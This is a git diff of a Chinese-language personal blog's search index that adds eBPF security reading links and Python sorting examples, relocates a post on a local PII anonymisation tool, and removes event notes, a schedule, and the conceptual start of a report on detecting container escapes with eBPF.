+<p>Linux中基於eBPF的惡意利用與檢測機制: <a href="https://kknews.cc/zh-tw/n/gx6j5y9.html">https://kknews.cc/zh-tw/n/gx6j5y9.html</a></p>
+<p>高效入門eBPF:<br><a href="https://github.com/gojue/ebpf-slide/blob/master/eBPF_basic/%E9%AB%98%E6%95%88%E5%85%A5%E9%97%A8eBPF-%E8%A5%BF%E5%AE%89%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6-%E8%B4%BA%E4%B8%9C%E5%8D%87.pdf">https://github.com/gojue/ebpf-slide/blob/master/eBPF_basic&#x2F;%E9%AB%98%E6%95%88%E5%85%A5%E9%97%A8eBPF-%E8%A5%BF%E5%AE%89%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6-%E8%B4%BA%E4%B8%9C%E5%8D%87.pdf</a></p>
+<p>分享一些eBPF技术相关的PDF: <a href="https://www.cnxct.com/ebpf-slide-pdf-share/#ftoc-heading-3">https://www.cnxct.com/ebpf-slide-pdf-share/#ftoc-heading-3</a></p>
+<p>复现基于eBPF实现的Docker逃逸: <a href="https://drivertom.blogspot.com/2022/01/ebpfdocker.html">https://drivertom.blogspot.com/2022/01/ebpfdocker.html</a></p>
+<p>黑客利用 Linux eBPF 持续传播恶意软件: <a href="https://www.anquanke.com/post/id/302837">https://www.anquanke.com/post/id/302837</a></p>
+<p>DEFCON: <a href="https://defcon.org/html/defcon-29/dc-29-speakers.html#path">https://defcon.org/html/defcon-29/dc-29-speakers.html#path</a> </p>
+<p>Day04 - (攻擊) 容器逃逸手法 nsenter: <a href="https://ithelp.ithome.com.tw/m/articles/10316981">https://ithelp.ithome.com.tw/m/articles/10316981</a></p>
+<p>eBPF linux運行時惡意利用: <a href="https://v.qq.com/txp/iframe/player.html?vid=e33246j5zi5">https://v.qq.com/txp/iframe/player.html?vid=e33246j5zi5</a></p>
+<p>datadog的eBPF安全检测机制分析: <a href="https://mp.weixin.qq.com/s/SAPz4Z1m2gVtQWzt68u6eg">https://mp.weixin.qq.com/s/SAPz4Z1m2gVtQWzt68u6eg</a></p>
+]]></content>
+      <categories>
+        <category>資安</category>
+      </categories>
+  </entry>
+  <entry>
     <title>THJCC CTF 2025</title>
     <url>/20250421/</url>
     <content><![CDATA[<h1 id="好久沒打CTF"><a href="#好久沒打CTF" class="headerlink" title="好久沒打CTF!"></a>好久沒打CTF!</h1><p>只打不到5小時，原本只是來打web，沒想到還有時間就打下去了:D<br>蠻意外排名有 總排59&#x2F;133 分組27&#x2F;65 我以為專挑基礎題不會前50%的說xd</p>
@@ -257,6 +476,7 @@
 <h2 id="1-泡沫排序法-bubble-sort"><a href="#1-泡沫排序法-bubble-sort" class="headerlink" title="1. 泡沫排序法 (bubble sort)"></a>1. 泡沫排序法 (bubble sort)</h2><h3 id="基本上就是兩層迴圈下去跑，只要前面的比後面大就交換。"><a href="#基本上就是兩層迴圈下去跑，只要前面的比後面大就交換。" class="headerlink" title="基本上就是兩層迴圈下去跑，只要前面的比後面大就交換。"></a>基本上就是兩層迴圈下去跑，只要前面的比後面大就交換。</h3><p>時間複雜度 O(n²)</p>
 <p>基本架構:</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>;j&lt;n-i<span class="number">-1</span>;j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[j]&gt;arr[j<span class="number">+1</span>]) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(arr[j],arr[j<span class="number">+1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">arr=[<span class="number">64</span>,<span class="number">25</span>,<span class="number">12</span>,<span class="number">22</span>,<span class="number">11</span>]</span><br><span class="line">n=<span class="built_in">len</span>(arr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>-i):</span><br><span class="line">        <span class="keyword">if</span> arr[j]&gt;arr[j+<span class="number">1</span>]:</span><br><span class="line">            arr[j],arr[j+<span class="number">1</span>]=arr[j+<span class="number">1</span>],arr[j]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr)</span><br></pre></td></tr></table></figure>
 
 <p>gif圖示:</p>
 <div style="display: flex; justify-content: space-between;">
@@ -272,6 +492,8 @@
 <h2 id="2-選擇排序法-Selection-Sort"><a href="#2-選擇排序法-Selection-Sort" class="headerlink" title="2. 選擇排序法 (Selection Sort)"></a>2. 選擇排序法 (Selection Sort)</h2><h3 id="基本上也是兩層迴圈下去跑，找到整個陣列中的最小值，把數值存在變數中，跟前面的換。"><a href="#基本上也是兩層迴圈下去跑，找到整個陣列中的最小值，把數值存在變數中，跟前面的換。" class="headerlink" title="基本上也是兩層迴圈下去跑，找到整個陣列中的最小值，把數值存在變數中，跟前面的換。"></a>基本上也是兩層迴圈下去跑，找到整個陣列中的最小值，把數值存在變數中，跟前面的換。</h3><p>時間複雜度 O(n²)</p>
 <p>基本架構:</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++) &#123;</span><br><span class="line">    <span class="type">int</span> mn=i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j=i<span class="number">+1</span>;j&lt;n;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[j]&lt;arr[mn])&#123;</span><br><span class="line">            mn=j; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap</span>(arr[mn],arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">arr=[<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">n=<span class="built_in">len</span>(arr)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    min_idx=i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,n):</span><br><span class="line">        <span class="keyword">if</span> arr[j]&lt;arr[min_idx]:</span><br><span class="line">            min_idx=j</span><br><span class="line">    arr[i],arr[min_idx]=arr[min_idx],arr[i]</span><br><span class="line">    <span class="built_in">print</span>(arr)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;===&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(arr)</span><br></pre></td></tr></table></figure>
+
 <p>gif圖示:</p>
 <div style="display: flex; justify-content: space-between;">
     <div style="width: 50%; height: 50%;">
@@ -288,6 +510,7 @@
 <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">原始陣列:</span><br><span class="line">( |的前方是排序好的陣列 )</span><br><span class="line">1   2   4   5   6   |   3   8   7</span><br><span class="line"><span class="code">                        ^</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">3要往前插到最適合的位子</span><br><span class="line">1   2   4   5   6   |   3   8   7</span><br><span class="line"><span class="code">                  ^ (3跟6比，3&lt;6所以繼續往前比)</span></span><br><span class="line"><span class="code">1   2   4   5   6   |   3   8   7</span></span><br><span class="line"><span class="code">              ^ (3跟5比，3&lt;5所以繼續往前比)</span></span><br><span class="line"><span class="code">1   2   4   5   6   |   3   8   7</span></span><br><span class="line"><span class="code">          ^ (3跟4比，3&lt;4所以繼續往前比)</span></span><br><span class="line"><span class="code">1   2   4   5   6   |   3   8   7</span></span><br><span class="line"><span class="code">      ^ (3跟2比，3&gt;2所以插這邊最適合)</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">按照邏輯用迴圈往下跑...</span><br><span class="line">1   2   3   4   5   6   |   8   7</span><br><span class="line"><span class="code">                       ^ (8跟6比，8&gt;6所以插這邊最適合)</span></span><br><span class="line"><span class="code">1   2   3   4   5   6   8   |   7</span></span><br><span class="line"><span class="code">                          ^ (7跟8比，7&lt;8所以繼續往前比)</span></span><br><span class="line"><span class="code">1   2   3   4   5   6   8   |   7</span></span><br><span class="line"><span class="code">                      ^ (7跟6比，7&gt;6所以插這邊最適合)</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">final:</span><br><span class="line">1   2   3   4   5   6   7   8   |</span><br><span class="line"><span class="code">                </span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++) &#123;</span><br><span class="line">    <span class="type">int</span> key=arr[i];</span><br><span class="line">    <span class="type">int</span> j=i<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (j&gt;=<span class="number">0</span>&amp;&amp;arr[j]&gt;key) &#123;</span><br><span class="line">        arr[j<span class="number">+1</span>]=arr[j];</span><br><span class="line">        j--;</span><br><span class="line">    &#125;</span><br><span class="line">    arr[j<span class="number">+1</span>]=key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">arr=[<span class="number">64</span>,<span class="number">25</span>,<span class="number">12</span>,<span class="number">22</span>,<span class="number">11</span>]</span><br><span class="line">n=<span class="built_in">len</span>(arr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">    key=arr[i]</span><br><span class="line">    j=i-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j&gt;=<span class="number">0</span> <span class="keyword">and</span> arr[j]&gt;key:</span><br><span class="line">        arr[j+<span class="number">1</span>]=arr[j]</span><br><span class="line">        j-=<span class="number">1</span></span><br><span class="line">    arr[j+<span class="number">1</span>]=key</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>gif圖示:</p>
 <div style="display: flex; justify-content: space-between;">
     <div style="width: 50%; height: 50%;">
@@ -356,6 +579,69 @@
 <p><code>無營利 僅供分享</code><br>資料來源:維基百科</p>
 <h2 id="觀念題題庫"><a href="#觀念題題庫" class="headerlink" title="觀念題題庫"></a>觀念題題庫</h2><p><a href="https://apcs.csie.ntnu.edu.tw/wp-content/uploads/2022/10/%E8%A7%80%E5%BF%B5%E9%A1%8C_%E9%A1%8C%E5%9E%8B%E7%AF%84%E4%BE%8B.pdf">https://apcs.csie.ntnu.edu.tw/wp-content/uploads/2022/10/%E8%A7%80%E5%BF%B5%E9%A1%8C_%E9%A1%8C%E5%9E%8B%E7%AF%84%E4%BE%8B.pdf</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>Local PII Extractor：支援中文的本地個資識別與匿名化工具</title>
+    <url>/20250528/</url>
+    <content><![CDATA[<h1 id="🛡️-Local-PII-Extractor：個資識別與匿名化工具"><a href="#🛡️-Local-PII-Extractor：個資識別與匿名化工具" class="headerlink" title="🛡️ Local PII Extractor：個資識別與匿名化工具"></a>🛡️ Local PII Extractor：個資識別與匿名化工具</h1><p>GitHub Repository：<a href="https://github.com/chewu-0319/Local_PII_Extractor">https://github.com/chewu-0319/Local_PII_Extractor</a></p>
+<p>個資提取與替換工具使用 spaCy NER + 正規表示式完成雙重偵測，並提供簡潔 GUI 操作介面。<br><img src="/images/p13.png"></p>
+<hr>
+<h1 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h1><p>許多使用者習慣將資料輸入至如 GPT, Grok或Claude等AI模型進行處理，但這些資料可能包含機敏資訊（例如電話號碼、身分證號、信用卡資訊等），直接上傳可能面臨個資外洩的風險。</p>
+<p>那我就想到，如果能在上傳資料到這些大語言模型之前，先在本地<strong>自動</strong>把重要資料先移除 (手動的話會很久很麻煩)，避免資料偷偷被這些公司拿去蒐集訓練，造成個資外洩，所以就結合自己在自然語言處理領域的研究，使用NER的方式去實作。</p>
+<p>開發 <strong>Local PII Extractor</strong>，支援中文的本地個資提取與匿名化工具，使用spaCy與正規表示式進行雙重偵測，並提供簡潔的 GUI 操作介面，讓使用者能夠在本地環境中安全地處理敏感資料。</p>
+<h1 id="架構"><a href="#架構" class="headerlink" title="架構"></a>架構</h1><p><img src="/images/p14.png"></p>
+<hr>
+<h1 id="動機"><a href="#動機" class="headerlink" title="動機"></a>動機</h1><ul>
+<li><strong>資料安全性</strong>：避免將包含敏感資訊的資料上傳至雲端，降低資料外洩風險。</li>
+<li><strong>支援中文處理</strong>：現有的 PII 工具多以英文為主，缺乏對中文的良好支援。</li>
+<li><strong>易於使用</strong>：透過 GUI 介面，讓非技術背景的使用者也能輕鬆操作。</li>
+</ul>
+<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ul>
+<li><strong>雙重偵測機制</strong>：結合 spaCy 的自然語言處理能力與正規表示式，提升個資識別的準確性。</li>
+<li><strong>支援多種個資類型</strong>：能夠識別並處理電話號碼、身分證號、信用卡資訊等常見的敏感資訊。</li>
+<li><strong>本地處理</strong>：所有資料處理皆在本地進行，無需連接網路，保障資料隱私。</li>
+<li><strong>GUI 操作介面</strong>：提供直觀的圖形介面，方便使用者進行資料上傳、處理與下載。</li>
+</ul>
+<h1 id="技術"><a href="#技術" class="headerlink" title="技術"></a>技術</h1><ul>
+<li><p><strong>程式語言</strong>：Python</p>
+</li>
+<li><p><strong>主要套件</strong>：</p>
+<ul>
+<li><a href="https://spacy.io/">spaCy</a>：用於自然語言處理與實體識別(NER)。</li>
+<li><code>re</code>（正規表示式）：輔助識別特定格式的敏感資訊。</li>
+<li><code>tkinter</code>：建立 GUI 操作介面。</li>
+</ul>
+</li>
+</ul>
+<h1 id="使用說明"><a href="#使用說明" class="headerlink" title="使用說明"></a>使用說明</h1><ol>
+<li><p><strong>安裝依賴套件</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>啟動應用程式</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python main.py</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>操作流程</strong>：</p>
+<ul>
+<li>啟動後，會出現 GUI 介面。</li>
+<li>點選「選擇檔案」上傳欲處理的文本檔案。</li>
+<li>點選「開始處理」，系統將自動識別並匿名化敏感資訊。</li>
+<li>處理完成後，點選「下載結果」取得處理後的檔案。</li>
+</ul>
+</li>
+</ol>
+<h1 id="📁-專案結構"><a href="#📁-專案結構" class="headerlink" title="📁 專案結構"></a>📁 專案結構</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Local_PII_Extractor/</span><br><span class="line">├── main.py           # 主程式，負責 GUI 與流程控制</span><br><span class="line">├── utils.py          # 工具函式，包含資料處理邏輯</span><br><span class="line">├── requirements.txt  # 依賴套件清單</span><br><span class="line">├── README.md         # 專案說明文件</span><br><span class="line">└── png/              # 存放圖片</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="🔍-未來規劃"><a href="#🔍-未來規劃" class="headerlink" title="🔍 未來規劃"></a>🔍 未來規劃</h1><ul>
+<li><strong>支援更多語言</strong>：擴展對其他語言（如日文、韓文等）的支援。</li>
+<li><strong>提升識別準確率</strong>：引入更先進的 NLP 模型，提升個資識別的準確性。</li>
+<li><strong>增加批次處理功能</strong>：允許使用者一次處理多個檔案，提高效率。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>資安</category>
+      </categories>
   </entry>
   <entry>
     <title>AIS3 2024 pre-exam</title>
@@ -857,382 +1143,6 @@ ABaB
       </categories>
   </entry>
   <entry>
-    <title>Local PII Extractor：支援中文的本地個資識別與匿名化工具</title>
-    <url>/20250528/</url>
-    <content><![CDATA[<h1 id="🛡️-Local-PII-Extractor：個資識別與匿名化工具"><a href="#🛡️-Local-PII-Extractor：個資識別與匿名化工具" class="headerlink" title="🛡️ Local PII Extractor：個資識別與匿名化工具"></a>🛡️ Local PII Extractor：個資識別與匿名化工具</h1><p>GitHub Repository：<a href="https://github.com/chewu-0319/Local_PII_Extractor">https://github.com/chewu-0319/Local_PII_Extractor</a></p>
-<p>個資提取與替換工具使用 spaCy NER + 正規表示式完成雙重偵測，並提供簡潔 GUI 操作介面。<br><img src="/images/p13.png"></p>
-<hr>
-<h1 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h1><p>許多使用者習慣將資料輸入至如 GPT, Grok或Claude等AI模型進行處理，但這些資料可能包含機敏資訊（例如電話號碼、身分證號、信用卡資訊等），直接上傳可能面臨個資外洩的風險。</p>
-<p>那我就想到，如果能在上傳資料到這些大語言模型之前，先在本地<strong>自動</strong>把重要資料先移除 (手動的話會很久很麻煩)，避免資料偷偷被這些公司拿去蒐集訓練，造成個資外洩，所以就結合自己在自然語言處理領域的研究，使用NER的方式去實作。</p>
-<p>開發 <strong>Local PII Extractor</strong>，支援中文的本地個資提取與匿名化工具，使用spaCy與正規表示式進行雙重偵測，並提供簡潔的 GUI 操作介面，讓使用者能夠在本地環境中安全地處理敏感資料。</p>
-<h1 id="架構"><a href="#架構" class="headerlink" title="架構"></a>架構</h1><p><img src="/images/p14.png"></p>
-<hr>
-<h1 id="動機"><a href="#動機" class="headerlink" title="動機"></a>動機</h1><ul>
-<li><strong>資料安全性</strong>：避免將包含敏感資訊的資料上傳至雲端，降低資料外洩風險。</li>
-<li><strong>支援中文處理</strong>：現有的 PII 工具多以英文為主，缺乏對中文的良好支援。</li>
-<li><strong>易於使用</strong>：透過 GUI 介面，讓非技術背景的使用者也能輕鬆操作。</li>
-</ul>
-<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ul>
-<li><strong>雙重偵測機制</strong>：結合 spaCy 的自然語言處理能力與正規表示式，提升個資識別的準確性。</li>
-<li><strong>支援多種個資類型</strong>：能夠識別並處理電話號碼、身分證號、信用卡資訊等常見的敏感資訊。</li>
-<li><strong>本地處理</strong>：所有資料處理皆在本地進行，無需連接網路，保障資料隱私。</li>
-<li><strong>GUI 操作介面</strong>：提供直觀的圖形介面，方便使用者進行資料上傳、處理與下載。</li>
-</ul>
-<h1 id="技術"><a href="#技術" class="headerlink" title="技術"></a>技術</h1><ul>
-<li><p><strong>程式語言</strong>：Python</p>
-</li>
-<li><p><strong>主要套件</strong>：</p>
-<ul>
-<li><a href="https://spacy.io/">spaCy</a>：用於自然語言處理與實體識別(NER)。</li>
-<li><code>re</code>（正規表示式）：輔助識別特定格式的敏感資訊。</li>
-<li><code>tkinter</code>：建立 GUI 操作介面。</li>
-</ul>
-</li>
-</ul>
-<h1 id="使用說明"><a href="#使用說明" class="headerlink" title="使用說明"></a>使用說明</h1><ol>
-<li><p><strong>安裝依賴套件</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>啟動應用程式</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python main.py</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>操作流程</strong>：</p>
-<ul>
-<li>啟動後，會出現 GUI 介面。</li>
-<li>點選「選擇檔案」上傳欲處理的文本檔案。</li>
-<li>點選「開始處理」，系統將自動識別並匿名化敏感資訊。</li>
-<li>處理完成後，點選「下載結果」取得處理後的檔案。</li>
-</ul>
-</li>
-</ol>
-<h1 id="📁-專案結構"><a href="#📁-專案結構" class="headerlink" title="📁 專案結構"></a>📁 專案結構</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Local_PII_Extractor/</span><br><span class="line">├── main.py           # 主程式，負責 GUI 與流程控制</span><br><span class="line">├── utils.py          # 工具函式，包含資料處理邏輯</span><br><span class="line">├── requirements.txt  # 依賴套件清單</span><br><span class="line">├── README.md         # 專案說明文件</span><br><span class="line">└── png/              # 存放圖片</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="🔍-未來規劃"><a href="#🔍-未來規劃" class="headerlink" title="🔍 未來規劃"></a>🔍 未來規劃</h1><ul>
-<li><strong>支援更多語言</strong>：擴展對其他語言（如日文、韓文等）的支援。</li>
-<li><strong>提升識別準確率</strong>：引入更先進的 NLP 模型，提升個資識別的準確性。</li>
-<li><strong>增加批次處理功能</strong>：允許使用者一次處理多個檔案，提高效率。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>資安</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>g0v summit 2024</title>
-    <url>/g0vsummit/</url>
-    <content><![CDATA[<h1 id="g0v-summit"><a href="#g0v-summit" class="headerlink" title="g0v summit"></a>g0v summit</h1><h2 id="我都在幹嘛"><a href="#我都在幹嘛" class="headerlink" title="我都在幹嘛?"></a>我都在幹嘛?</h2><ul>
-<li>工作人員<ul>
-<li>搬椅子</li>
-<li>搬桌子</li>
-<li>場佈</li>
-<li>動線規劃</li>
-<li>拆</li>
-<li>坐在電梯前指引</li>
-<li>被外國人問路</li>
-</ul>
-</li>
-<li>福利<ul>
-<li>吃吃吃吃吃吃吃吃…</li>
-<li>喝喝喝喝喝喝喝喝…</li>
-<li>免費住宿 中研院活動中心</li>
-<li>仙草茶 (呵</li>
-</ul>
-</li>
-</ul>
-<h2 id="Day-0-場佈"><a href="#Day-0-場佈" class="headerlink" title="Day 0(場佈)"></a>Day 0(場佈)</h2><ul>
-<li>搬椅子</li>
-<li>搬桌子</li>
-<li>動線規劃</li>
-<li>吃便當</li>
-<li>晚上去饒河夜市</li>
-</ul>
-<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><ul>
-<li>早餐三明治+紅茶</li>
-<li>坐在電梯前好幾個小時</li>
-<li>R0搬椅子</li>
-<li>閒逛</li>
-<li>吃漢堡 吃撈麵</li>
-<li>聽南韓講者超酷</li>
-<li>有夠累</li>
-<li>睡在VIP room</li>
-<li>房間看西甲</li>
-<li>還以為有夜唱</li>
-</ul>
-<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><ul>
-<li>繼續吃</li>
-<li>聽台灣爬蟲開源資料講者 超幽默</li>
-<li>仙草茶</li>
-<li>有個阿北專門來吃東西的</li>
-<li>收桌子</li>
-<li>拆東西</li>
-<li>在閉幕簡報上看到自己 很感動</li>
-<li>慶功宴 佛跳牆 龍蝦 雞佛 啤酒好欸</li>
-<li>才知道現場很多都是資工大佬 頂大好電</li>
-<li>大家都很好聊 一堆E人</li>
-<li>CPY有問題找他就對了 兆翌超好聊 喬不會喝酒笑死 柚子講者超電 賴彥江超幽默 </li>
-<li>口譯大哥說他18歲 pm5光頭超好認 攝影大哥敬酒*n次 室友雨辰居然是文組的</li>
-<li>有人喝醉超好笑 啤酒而已欸</li>
-<li>搭高鐵 好不捨</li>
-<li>整個g0v氣氛好好 好喜歡 2026再來!</li>
-</ul>
-<h1 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h1><p>我愛g0v summit，氣氛好讚，工人福利給過，認識好多新朋友，g0v summit 2026見!</p>
-<hr>
-<!-- Start of CuterCounter Code -->
-<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=huxpnnqf&nd=6&style=11" border="0" alt="網頁計數器"></a></p>
-<!-- End of CuterCounter Code -->
-]]></content>
-      <categories>
-        <category>紀錄</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>個人時間表</title>
-    <url>/personal_schedule/</url>
-    <content><![CDATA[<h1 id="此為-2024-10月-2025寒假前-日程表"><a href="#此為-2024-10月-2025寒假前-日程表" class="headerlink" title="此為 2024&#x2F;10月-2025寒假前 日程表"></a>此為 2024&#x2F;10月-2025寒假前 日程表</h1><p><img src="/images/sch.png"></p>
-<ul>
-<li>藍色: 在學校</li>
-<li>綠色: 在家裡忙</li>
-<li>紫色: 社團</li>
-<li>灰色: 空閒</li>
-</ul>
-<p>聯絡方式:</p>
-<ul>
-<li>email: <a href="mailto:dylan.jc2222@gmail.com" title="吳昕哲">吳昕哲</a></li>
-<li>discord: <a href="https://discordapp.com/users/768889520280043561" title="che哲#4541">che哲#4541</a></li>
-<li>instagram: <a href="https://www.instagram.com/che._.wu/" title="che._.wu">che._.wu</a></li>
-</ul>
-<hr>
-<!-- Start of CuterCounter Code -->
-<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=hxqxdco&nd=6&style=11" border="0" alt="免費網站計數器"></a></p>
-<!-- End of CuterCounter Code -->
-
-]]></content>
-      <categories>
-        <category>個人時間表</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>基於eBPF的容器逃逸行為偵測機制研究與實作</title>
-    <url>/20250513/</url>
-    <content><![CDATA[<h1 id="基於eBPF的容器逃逸行為偵測機制研究與實作"><a href="#基於eBPF的容器逃逸行為偵測機制研究與實作" class="headerlink" title="基於eBPF的容器逃逸行為偵測機制研究與實作"></a>基於eBPF的容器逃逸行為偵測機制研究與實作</h1><p>前情提要: 這篇是我的資安研究報告，內容原本是做成docx檔案，現在為了放上blog才轉成<code>.md</code>，若有沒正確轉成markdown語法而造成版面跑掉的話請多包涵:D</p>
-<h1 id="一、緒論"><a href="#一、緒論" class="headerlink" title="一、緒論"></a>一、緒論</h1><p>隨著容器化技術（Containerization）在各領域的廣泛應用，系統資源的管理與部署效率大幅提升。Docker、containerd 等容器平台讓應用程式在不同環境中快速部署、隔離運行並高效擴展。然而，這種虛擬化程度較低的隔離機制也帶來潛在風險——一旦攻擊者突破容器限制，可能對宿主機（Host Machine）造成嚴重威脅。</p>
-<p>傳統上，作業系統透過 namespace 和 cgroup 機制來隔離容器與主機資源。然而，若容器被賦予過多權限（例如 –privileged），將獲得近似宿主機的能力，可能導致<strong>容器逃逸（Container Escape）</strong>攻擊。攻擊者可從受限容器中控制宿主機，取得 root 權限、存取 &#x2F;etc&#x2F;passwd 等敏感檔案，甚至橫向移動攻擊其他容器。</p>
-<p>為應對這些安全威脅，eBPF（Extended Berkeley Packet Filter） 自 2014 年引入以來，憑藉其高效性與安全性，已成為容器安全監控的熱門技術。它允許使用者撰寫微型程式並安全地掛載到內核的特定 hook 點（如 syscall、kprobe），在不中斷系統運作的情況下即時監控與攔截系統行為。</p>
-<h2 id="報告目的"><a href="#報告目的" class="headerlink" title="報告目的:"></a>報告目的:</h2><ul>
-<li>探討 eBPF 如何應用於容器逃逸偵測。</li>
-<li>建構實驗環境，模擬典型的容器逃逸行為。</li>
-<li>使用 eBPF 偵測並聚焦於模擬簡單的 chroot 和 mount 逃逸場景。</li>
-<li>驗證攻擊是否成功並能被有效捕捉，評估該偵測方法的實用性與可行性。</li>
-</ul>
-<h1 id="二、eBPF-技術背景"><a href="#二、eBPF-技術背景" class="headerlink" title="二、eBPF 技術背景"></a>二、eBPF 技術背景</h1><p>eBPF(Extended Berkeley Packet Filter)最初設計於1992年的BPF (Berkeley Packet Filter)，用於在內核空間過濾封包，提升網路封包處理效率，傳統BPF的功能有限，僅能處理簡單的封包邏輯，而eBPF作為其延伸版本，自linux kernel 3.18以來大幅擴展能力，成為一個能在內核安全執行自訂邏輯的沙箱虛擬機。<br>eBPF最大的特性是: 「無需修改內核原始碼，即可即時插入內核程式邏輯」，這使它成為理想的內核觀察者，</p>
-<h2 id="具備以下優勢"><a href="#具備以下優勢" class="headerlink" title="具備以下優勢:"></a>具備以下優勢:</h2><ul>
-<li><strong>動態載入、不需重啟系統</strong>: eBPF 程式可以動態載入至特定 hook 點，例如syscall、tracing、perf event、網路等，無需修改或重編譯核心。</li>
-<li><strong>安全性設計</strong>: 所有eBPF程式都會經過內核verifier去做驗證，保證其不會進入無限迴圈、不會越界訪問、不會導致系統崩潰，因此執行於內核空間，還是有極高的安全性。</li>
-<li><strong>效能開銷低</strong>: 相比傳統syscall hooking或其他內核模組，eBPF有更低的效能損耗，適合長時間、低干擾地執行監控任務。</li>
-<li><strong>語言支援強大</strong>: eBPF 程式通常以C或Rust撰寫，Python和Go用於使用者空間的編譯、載入和資料處理。</li>
-</ul>
-<h2 id="eBPF-的關鍵組件"><a href="#eBPF-的關鍵組件" class="headerlink" title="eBPF 的關鍵組件:"></a>eBPF 的關鍵組件:</h2><ul>
-<li><strong>BPF程式(eBPF Program)</strong>: 使用者撰寫的微型邏輯程式，會被掛載到指定的 hook 點。</li>
-<li><strong>BPF Map</strong>: 內核與使用者空間共用的資料結構，可用來交換資料，如記錄事件、累積計數、傳遞訊息。</li>
-<li><strong>使用者空間Loader</strong>: 負責編譯、驗證並載入eBPF程式，常見工具如 bcc、bpftrace、libbpf。</li>
-<li><strong>tracing 與 kprobe&#x2F;kretprobe</strong>: eBPF可以附掛於 kernel function的進入點(kprobe)或離開點(kretprobe)，實現行為追蹤。</li>
-</ul>
-<h2 id="在資訊安全的應用"><a href="#在資訊安全的應用" class="headerlink" title="在資訊安全的應用:"></a>在資訊安全的應用:</h2><ul>
-<li><strong>惡意程式偵測</strong>: 利用eBPF追蹤異常系統呼叫，如可疑的 file I&#x2F;O、網路連線或權限提升。</li>
-<li><strong>容器行為監控</strong>: 追蹤容器中執行的 syscall，辨識是否有異常逃逸操作。</li>
